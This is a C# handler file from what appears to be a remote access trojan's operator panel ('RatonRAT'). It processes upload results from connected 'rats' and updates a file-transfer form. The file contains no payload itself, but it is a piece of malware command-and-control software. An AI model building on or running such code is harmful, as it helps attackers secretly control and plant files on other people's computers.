using Stuff;
using Server.Connection;
using System.Windows.Forms;
using RatonRAT.ClientForms;

namespace Server.Handlers
{
    internal class HandleUpload
    {
        public void init(SillyClient SillyClient, Unpack unpack)
        {
            string uid = unpack.GetAsString("DUID");
            FormFile filef = (FormFile)Application.OpenForms["File ID: " + uid];
            if (filef != null)
            {
                if (filef.SillyClient == null)
                {
                    filef.SillyClient = SillyClient;
                    filef.timer1.Start();
                }
                filef.timer1.Stop();
                bool isOk = unpack.GetAsBoolen("isOk");
                if (isOk)
                {
                    filef.Status(unpack.GetAsString("Message"));
                    filef.CloseThis();
                }
                else
                {
                    filef.Status("Our rats died. (Fail)");
                }
            }
        }
    }
}
